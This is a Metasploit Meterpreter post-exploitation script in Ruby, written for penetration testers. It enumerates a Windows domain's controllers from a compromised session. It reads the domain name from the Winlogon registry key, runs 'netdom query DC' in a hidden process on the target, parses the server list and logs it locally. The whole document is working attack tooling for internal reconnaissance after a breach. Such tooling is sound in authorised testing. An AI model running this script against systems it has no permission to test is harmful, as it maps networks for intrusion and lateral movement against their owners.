# Author: Dark Harper at darkharper2@gmail.com 
# Ripped off largely from domain_list_users.rb by Carlos Perez - thank you!
#
# This came about from a question on #metasploit where someone wanted to know
# the domain controllers for a domain on which they had a meterpreter session.
# NOTE: at the moment it tries to determine the domain from the registry and asks
# the tester for the domain with the -d flag if it can't find out this way.
# The registry key it looks for is not there by default on Windows 7 and I can't
# work out an alternative key at the moment.
# Also, it uses the netdom command to work out the domain controller which limits
# this script to Windows 7/Server 2008 unless the admin has installed it. (need to
# verify this in lab). Unfortunately the above two things are mutually exclusive
# at the moment but I'll figure something out.
#
# I plan to expand this script to use different ways to enumerate the domain 
# controllers - %LOGONSERVER% for example. I may even go crazy and look at a 
# wider LDAP query module.
#
#-------------------------------------------------------------------------------
#Set General Variables used in the script

@client = client
domain = nil
servers = ""
list = []
host = @client.sys.config.sysinfo['Computer']
#-------------------------------------------------------------------------------
#Options and Option Parsing
opts = Rex::Parser::Arguments.new(
	"-d" => [ true, "Specify domain manually" ],
	"-h" => [ false, "Help menu." ]
)

opts.parse(args) { |opt, idx, val|
	case opt
	when "-h"
		print_line "Meterpreter Script for retrieving list of domain controllers on the network"
		print_line(opts.usage)
		raise Rex::Script::Completed
	when "-d"
		domain = val
	end
}

def unsupported
	print_error("This version of Meterpreter is not supported with this Script!")
	raise Rex::Script::Completed
end
#-------------------------------------------------------------------------------

def reg_getvaldata(key,valname)
    value = nil
    begin
        root_key, base_key = @client.sys.registry.splitkey(key)
        open_key = @client.sys.registry.open_key(root_key, base_key, KEY_READ)
        v = open_key.query_value(valname)
        value = v.data
        open_key.close
    end
    return value
end

if domain == nil
	print_status("Querying registry for domain name")
	begin
		domain = reg_getvaldata("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon","DefaultDomainName")
	rescue
		print_error("Registry key not found or not accessible, specify manually with -d")
		raise Rex::Script::Completed
	end
end

print_status("domain is #{domain}")

# Create Filename info to be appended to downloaded files
filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

unsupported if client.platform !~ /win32|win64/i

# Create a directory for the logs
logs = ::File.join(Msf::Config.log_directory, 'scripts','domain_controllers')
# Create the log directory
::FileUtils.mkdir_p(logs)
#logfile name
dest = logs + "/" + host + filenameinfo + ".txt"
print_status("found domain controllers will be saved to #{dest}")

################## MAIN ##################
# Run netdom query and verify that it ran successfully
print_status("Enumerating domain controllers for domain #{domain}")
netdom = "netdom query /D:" + domain
cmd = netdom + " DC"
print_status("cmd is #{cmd}")
r = @client.sys.process.execute(cmd, nil, {'Hidden' => true, 'Channelized' => true})
while(d = r.channel.read)
	servers << d
	if d=~/Operation failed/
		print_error("Could not enumerate servers!")
		raise Rex::Script::Completed
	end
	break if d == ""
end
#split output in to lines
domservers = servers.split("\n")
#Select only those lines that have the usernames
##a_size = (out_lines.length - 8)
##domadmins = out_lines.slice(6,a_size)

# Get only the server names
domainserver_list = []
domservers.each do |d|
	d.split("  ").compact.each do |s|
		domainserver_list << s.strip if s.strip != "" and not s =~ /^List of domain controllers/ and not s =~ /^The command completed successfully/
	end
end
#process servers found
print_status("Domain Controllers found:")
domainserver_list.each do |u|
	print_status("#{u}")
	file_local_write(dest, "#{u}")
	list << u.downcase
end
